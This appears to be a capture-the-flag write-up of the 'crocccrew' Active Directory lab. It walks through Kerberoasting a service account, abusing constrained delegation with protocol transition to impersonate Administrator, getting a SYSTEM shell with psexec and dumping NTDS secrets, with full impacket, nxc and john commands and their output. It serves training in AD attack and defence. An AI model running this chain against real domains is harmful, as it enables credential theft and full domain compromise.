01 - Environment & Scope

Environment & Scope

crocccrew was a single-domain Active Directory target. The exposed machine was the DC for COOCTUS.CORP. The attack path was short, but it still had a real AD lesson: a weak low-privileged account is dangerous when it can enumerate a delegation account.

02 - Initial Access

Initial Access as Visitor

What pointed us here The room gave us a visitor-style credential. The mistake would be to treat it as useless. In AD, a normal authenticated user can still query a lot of directory data, including SPNs. 
# Validate the credential and get the domain view
nxc smb 10.130.154.0 \
    -d COOCTUS.CORP \
    -u Visitor \
    -p 'REDACTED_VISITOR_PASSWORD'

[+] COOCTUS.CORP\Visitor:REDACTED_VISITOR_PASSWORD

The visitor account also gave us the user flag. More importantly, it gave us enough AD visibility to ask one question: which accounts own SPNs?

03 - Credential Access

Kerberoasting password-reset

What pointed us here LDAP enumeration showed password-reset with the SPN HTTP/dc.cooctus.corp. An SPN on a user account means Kerberoasting is in play: we can request a service ticket and crack the service account's password offline.

Kerberoasting is useful because the KDC gives any authenticated user a service ticket for a registered SPN. That ticket is encrypted with the service account's long-term key. If the password is weak, the ticket becomes an offline password-cracking target.

# Request TGS tickets for SPN-bearing users
impacket-GetUserSPNs \
    -dc-ip 10.130.154.0 \
    'COOCTUS.CORP/Visitor:REDACTED_VISITOR_PASSWORD' \
    -request \
    -outputfile TGS.txt

# Crack the Kerberoast hash
john --wordlist=/usr/share/wordlists/rockyou.txt TGS.txt

password-reset:REDACTED_SERVICE_PASSWORD

The account name matters. A user called password-reset is already telling us this identity may be tied to admin workflows. The SPN and the cracked password gave us the next identity. Delegation decided whether that identity was actually dangerous.

04 - Delegation Analysis

Why Delegation Changed the Box

What pointed us here password-reset had constrained delegation to HTTP/dc.cooctus.corp with Protocol Transition. That is not just a service account. That is an account allowed to request tickets while pretending to be another user. 
# Confirm delegation rights
impacket-findDelegation \
    -dc-ip 10.130.154.0 \
    'COOCTUS.CORP/password-reset:REDACTED_SERVICE_PASSWORD'

AccountName      DelegationType                    DelegationRightsTo
password-reset  Constrained w/ Protocol Trans     HTTP/dc.cooctus.corp

The important term is Protocol Transition. Without it, the account would need a real user's forwardable ticket before it could delegate. With it, the account can ask the KDC to create a service ticket as another user. That turns one cracked service account into an impersonation primitive.

05 - Privilege Escalation

S4U with Protocol Transition

The target SPN was HTTP, but the service we wanted for execution and dumping was not HTTP. This is where -altservice matters. The KDC issues the ticket to the SPN that the delegation account is allowed to use, then impacket rewrites the service name in the ticket so it can be presented to CIFS.

# Request a delegated ticket as Administrator
impacket-getST \
    -dc-ip 10.130.154.0 \
    -spn 'HTTP/dc.cooctus.corp' \
    -impersonate Administrator \
    -altservice 'cifs/dc.cooctus.corp' \
    'COOCTUS.CORP/password-reset:REDACTED_SERVICE_PASSWORD'

[*] Impersonating Administrator
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/dc.cooctus.corp to cifs/dc.cooctus.corp
[*] Saved credential to Administrator@cifs_dc.cooctus.corp@COOCTUS.CORP.ccache
Why this is not magic Kerberos tickets are encrypted to the account that owns the SPN. The service name is not the same thing as the cryptographic key. -altservice abuses the part that can be rewritten without invalidating the PAC.
06 - Execution

Domain Controller Access

With the CIFS ticket in the cache, no password or hash is needed. We point impacket at the DC and let Kerberos do the authentication.

# Use the delegated Kerberos ticket
export KRB5CCNAME=Administrator@cifs_dc.cooctus.corp@COOCTUS.CORP.ccache

impacket-psexec \
    -k -no-pass \
    -dc-ip 10.130.154.0 \
    Administrator@dc.cooctus.corp

C:\Windows\system32> whoami
nt authority\system
07 - Credential Dumping

DCSync / NTDS Dump

What pointed us here We had a ticket impersonating Administrator to the DC. At that point, dumping NTDS is the proof of domain impact. It shows the chain did not only give a shell, it gave control over domain secrets. 
# Dump domain secrets with the Kerberos ticket
export KRB5CCNAME=Administrator@cifs_dc.cooctus.corp@COOCTUS.CORP.ccache

impacket-secretsdump \
    -k -no-pass \
    -dc-ip 10.130.154.0 \
    dc.cooctus.corp \
    -just-dc

10 - Lessons

Key Takeaways

ConceptLesson
Low-priv users A basic domain account is still enough to enumerate SPNs, delegation settings, and many useful AD relationships.
Kerberoasting The risk is not only that the account has an SPN. The real risk appears when the SPN account also has sensitive delegation rights.
Protocol Transition When TRUSTED_TO_AUTH_FOR_DELEGATION is present, the account can manufacture a service ticket as another user. That is a very different level of impact.
-altservice If the account is delegated to HTTP but you need CIFS, test whether the ticket can be rewritten for the service you actually need.
NTDS impact A DC shell is impact. An NTDS dump is proof that the whole domain is compromised.
